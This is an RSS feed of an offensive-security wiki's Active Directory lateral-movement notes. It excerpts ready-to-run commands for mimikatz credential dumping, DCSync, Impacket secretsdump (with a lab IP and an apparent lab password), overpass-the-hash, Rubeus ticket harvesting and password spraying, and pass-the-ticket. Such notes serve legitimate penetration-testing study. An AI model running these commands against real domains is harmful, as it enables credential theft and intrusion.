<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Lateral Movement on</title><link>https://wiki.bufu-sec.com/active_directory/lateral_movement/</link><description>Recent content in Lateral Movement on</description><generator>Hugo -- gohugo.io</generator><language>en-US</language><lastBuildDate>Sat, 06 Nov 2021 10:02:54 +0100</lastBuildDate><atom:link href="https://wiki.bufu-sec.com/active_directory/lateral_movement/index.xml" rel="self" type="application/rss+xml"/><item><title>PowerShell Remoting</title><link>https://wiki.bufu-sec.com/active_directory/lateral_movement/ps_remoting/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/lateral_movement/ps_remoting/</guid><description>General # psexec on steroids, enabled by default from Server 2012 Might need to enable it on Desktop, admin privs required -&amp;gt; Enable-PSRemoting Opens elevated shell on target if admin creds used Two types: One-to-one One-to-many One-to-One - PSSession # Interactive Runs in new process (wsmprovhost) Stateful # Enter interactive prompt on remote system for one-time use Enter-PSSession -ComputerName ws01.lab.local # Enter previously created session $Sess = New-PSSession -ComputerName ws01.</description></item><item><title>Credential Dumping</title><link>https://wiki.bufu-sec.com/active_directory/lateral_movement/credential_dumping/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/lateral_movement/credential_dumping/</guid><description>Invoke-Mimikatz # # Dump on local machine Invoke-Mimikatz -DumpCreds # Dump credentials on multiple remote machiens through PSRemoting cmdlet Invoke-Command Invoke-Mimikatz -DumpCreds -ComputerName @(&amp;quot;sys1&amp;quot;, &amp;quot;sys2&amp;quot;)</description></item><item><title>DC Sync</title><link>https://wiki.bufu-sec.com/active_directory/lateral_movement/dc_sync/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/lateral_movement/dc_sync/</guid><description>Locally # # DCSync locally with mimikatz for specific user Invoke-Mimikatz -Command '&amp;quot;lsadump::dcsync /user:dcorp\krbtgt&amp;quot;' Remotely # # Get NTDS.dit via Impacket secretsdump remotely secretsdump.py -dc-ip 10.10.149.145 spookysec.local/backup:backup2517860@10.10.149.145</description></item><item><title>Overpass-the-Hash</title><link>https://wiki.bufu-sec.com/active_directory/lateral_movement/overpass_the_hash/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/lateral_movement/overpass_the_hash/</guid><description>General # Similar to pass-the-hash Creates valid kerberos ticket from NTLM hash of user Able to access any domain service and not just services that support NTLM authentication like in PTH attacks Exploitation with Invoke-Mimikatz # Invoke-Mimikatz -Command '&amp;quot;sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:&amp;lt;HASH&amp;gt; /run:powershell.exe&amp;quot;'</description></item><item><title>Ticket Harvesting</title><link>https://wiki.bufu-sec.com/active_directory/lateral_movement/ticket_harvesting/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/lateral_movement/ticket_harvesting/</guid><description>Harvesting Tickets # # Harvest for TGTs every 30 seconds Rubeus.exe harvest /interval:30 Brute-forcing / Password-spraying # Rubeus.exe brute /password:Password1 /noticket</description></item><item><title>Pass-the-Ticket</title><link>https://wiki.bufu-sec.com/active_directory/lateral_movement/pass_the_ticket/</link><pubDate>Sat, 06 Nov 2021 11:53:35 +0100</pubDate><guid>https://wiki.bufu-sec.com/active_directory/lateral_movement/pass_the_ticket/</guid><description>Overview # Use mimikatz to dump TGT from LSASS memory Will give us .kirbi ticket which can be used to gain domain admin if ticket is from domain admin Reuse old ticket to impersonate that ticket Can also use base64-encoded tickets gathered with Rubeus Look for Administrator tickets Exploitation # # Start mimikatz and get SYSTEM mimikatz.exe privilege::debug token::elevate # Export all .kirbi tickets to current directory sekurlsa::tickets /export # PTT with mimikatz kerberos::ptt &amp;lt;ticket&amp;gt; # List cached tickets klist Mitigation: # Don&amp;rsquo;t let domain admins log onto anything except the domain controller</description></item></channel></rss>